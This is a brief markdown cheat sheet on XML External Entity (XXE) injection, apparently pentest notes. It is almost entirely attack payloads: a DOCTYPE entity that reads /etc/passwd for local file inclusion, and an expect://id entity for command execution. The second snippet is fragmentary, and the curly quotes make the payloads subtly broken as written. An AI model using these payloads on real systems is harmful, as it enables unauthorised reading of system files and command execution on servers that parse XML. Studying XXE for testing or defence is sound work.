# XXE

## Concept
```<!Entity nooranet SYSTEM “file:///etc/passwd”>```

## Exploitation
- LFI
```xml
<!DOCTYPE foo[
<!Entity xxe SYSTEM “file:///etc/passwd”>]>
<foo>&xxe;</foo>
```
- Command Injection
```xml
<!Entity xxe SYSTEM “expect://id”>]>
```
